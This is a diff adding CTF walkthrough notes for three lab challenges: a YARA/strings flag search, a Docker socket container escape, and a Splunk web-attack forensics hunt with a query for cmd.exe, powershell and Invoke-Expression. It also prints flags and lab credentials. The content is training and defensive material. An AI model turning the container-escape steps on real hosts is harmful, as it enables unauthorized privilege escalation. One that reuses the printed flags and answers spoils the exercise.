@@ -1453,6 +1453,45 @@ Flag: `THM{number6-is-the-last-one!-DX!}`
 Flag: `THM{yougotnumber1-keep-it-going}`
 
 
-## Notes:
+### YARA Rules - The Mean One (Day 13)
 
-7am drops everyday
+1. Simple solve, inside of `/home/ubuntu/Downloads/easter`
+  - Use "old school way" to find strings (no yara needed): `cat *.jpg | strings | grep "TBFC"`
+2. Regex: `/TBFC:[A-Za-z0-9]+/`
+3. Message: `Find me in HopSec Island`
+
+### Containers - DoorDasher's Deminse (Day 14)
+
+This challenge is centralized around understanding (and possible exploitation/escalation) of docker.
+
+1. List running dockers: `docker ps` 
+2. Execute `docker exec -it uptime-checker sh` to enter the `uptime-checker` contianer under `sh`
+3. Socket validation `ls -la /var/run/docker.sock` : `srw-rw----    1 root     121              0 Dec 16 01:04 /var/run/docker.sock`
+4. `docker ps` from inside of the container and confirm the internals are running and escalate.
+```markdown
+CONTAINER ID   IMAGE                    COMMAND                  CREATED         STATUS         PORTS                                         NAMES
+771d1c9b0458   dasherapp:latest         "python app.py"          5 minutes ago   Up 5 minutes   0.0.0.0:5001->5000/tcp, [::]:5001->5000/tcp   dasherapp
+89b97c0c3e3e   wareville-times:latest   "/docker-entrypoint.…"   5 minutes ago   Up 5 minutes   0.0.0.0:5002->80/tcp, [::]:5002->80/tcp       wareville-times
+9738e42f622c   deployer:latest          "tail -f /dev/null"      5 minutes ago   Up 5 minutes                                                 deployer
+c1b79e275b6a   uptime-checker:latest    "/docker-entrypoint.…"   5 minutes ago   Up 5 minutes   0.0.0.0:5003->80/tcp, [::]:5003->80/tcp       uptime-checker
+```
+5. Execute `docker exec -it deployer bash` to enter `deployer` container.
+6. Identify the flag in `/flag.txt`
+7. Find the hidden flag inside of the news article: `http://HOST:5002`, notice the red text implying the password.
+
+Secret Password (deployer password): `DeployMaster2025!`
+Flag: `THM{DOCKER_ESCAPE_SUCCESS}`
+
+### Web Attack Forensics - Drone Alone (Day 15)
+
+_Host:_ `http://10.64.160.196:8000`
+_Username:_ `Blue`
+_Password:_ `Pass1234`
+
+1. Identify suspect web commands: `index=windows_apache_access (cmd.exe OR powershell OR "powershell.exe" OR "Invoke-Expression") | table _time host clientip uri_path uri_query status`
+2. Identify `/cgi-bin/hello.bat`
+3. Identify commands injection `powershell -c -e ...`
+4. Command ran from attacker `whoami.exe`
+5. Confirm enumeration `index=windows_sysmon *cmd.exe* *whoami*`
+
+## Notes:
